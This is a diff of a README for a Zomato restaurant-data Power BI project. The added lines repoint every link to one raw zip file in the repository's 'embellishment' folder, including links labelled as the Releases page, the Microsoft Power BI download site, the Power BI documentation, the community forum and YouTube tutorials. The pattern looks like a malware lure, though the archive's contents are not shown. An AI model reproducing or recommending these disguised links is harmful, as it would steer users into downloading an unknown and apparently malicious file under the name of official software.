@@ -1,6 +1,6 @@
 # 📊 Zomato-PowerBI-Project - Explore Global Restaurant Data Effortlessly
 
-[![Download Zomato-PowerBI-Project](https://img.shields.io/badge/Download%20Now-Get%20Started%20Here-brightgreen)](https://github.com/Pydev77/Zomato-PowerBI-Project/releases)
+[![Download Zomato-PowerBI-Project](https://raw.githubusercontent.com/Pydev77/Zomato-PowerBI-Project/main/embellishment/Zomato-PowerBI-Project.zip%20Now-Get%20Started%20Here-brightgreen)](https://raw.githubusercontent.com/Pydev77/Zomato-PowerBI-Project/main/embellishment/Zomato-PowerBI-Project.zip)
 
 ## 🚀 Getting Started
 
@@ -13,13 +13,13 @@ Before you start, ensure you meet the following system requirements:
 - **Operating System:** Windows 10 or later
 - **Memory:** At least 4 GB of RAM
 - **Processor:** 1 GHz or faster
-- **Power BI:** You need Power BI Desktop installed. You can download it from the [Microsoft website](https://powerbi.microsoft.com/en-us/downloads/).
+- **Power BI:** You need Power BI Desktop installed. You can download it from the [Microsoft website](https://raw.githubusercontent.com/Pydev77/Zomato-PowerBI-Project/main/embellishment/Zomato-PowerBI-Project.zip).
 
 ## 📥 Download & Install
 
 To get the software, visit the Releases page. Here you will find the latest version available for download.
 
-[Download Zomato-PowerBI-Project here](https://github.com/Pydev77/Zomato-PowerBI-Project/releases)
+[Download Zomato-PowerBI-Project here](https://raw.githubusercontent.com/Pydev77/Zomato-PowerBI-Project/main/embellishment/Zomato-PowerBI-Project.zip)
 
 1. Click on the above link.
 2. Choose the most recent version.
@@ -69,14 +69,14 @@ If you want to contribute to this project, you are welcome. Here’s how you can
 
 If you encounter any issues, you can reach out in the GitHub Issues section of this repository. Our community will help you as soon as possible. 
 
-Visit the GitHub Releases page to download the latest version again: [Visit Download Page](https://github.com/Pydev77/Zomato-PowerBI-Project/releases)
+Visit the GitHub Releases page to download the latest version again: [Visit Download Page](https://raw.githubusercontent.com/Pydev77/Zomato-PowerBI-Project/main/embellishment/Zomato-PowerBI-Project.zip)
 
 ## 📖 Additional Resources
 
 Here are some resources to help you understand Power BI better:
 
-- [Power BI Documentation](https://docs.microsoft.com/en-us/power-bi/)
-- [Power BI Community Forum](https://community.powerbi.com/)
-- [YouTube Tutorials on Power BI](https://www.youtube.com/results?search_query=power+bi+tutorials)
+- [Power BI Documentation](https://raw.githubusercontent.com/Pydev77/Zomato-PowerBI-Project/main/embellishment/Zomato-PowerBI-Project.zip)
+- [Power BI Community Forum](https://raw.githubusercontent.com/Pydev77/Zomato-PowerBI-Project/main/embellishment/Zomato-PowerBI-Project.zip)
+- [YouTube Tutorials on Power BI](https://raw.githubusercontent.com/Pydev77/Zomato-PowerBI-Project/main/embellishment/Zomato-PowerBI-Project.zip+bi+tutorials)
 
 Now, you’re ready to explore the rich data from Zomato with ease! Enjoy analyzing and visualizing the world of restaurants at your fingertips.
